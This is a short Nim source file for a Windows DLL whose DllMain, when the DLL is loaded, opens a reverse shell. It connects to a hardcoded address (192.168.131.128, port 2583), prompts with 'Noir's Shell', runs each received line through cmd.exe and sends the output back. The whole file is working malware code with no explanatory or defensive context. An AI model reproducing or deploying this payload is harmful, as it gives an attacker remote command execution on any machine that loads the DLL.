import winim/lean
import net, osproc, std/strformat

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDll: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    if fdwReason == DLL_PROCESS_ATTACH:
        # Variables
        let
            ip = "192.168.131.128"
            port = 2583
            sock = newSocket()
            prompt = "Noir's Shell $ "

        # Connection
        sock.connect(ip, Port(port))

        # Loop remote shell
        while true:
            send(sock, prompt)
            let args = recvLine(sock)

            # Execute
            try:
                let cmd = execProcess(fmt"cmd.exe /c " & args, options={poUsePath})
                send(sock, cmd)
            except:
                break

    return true
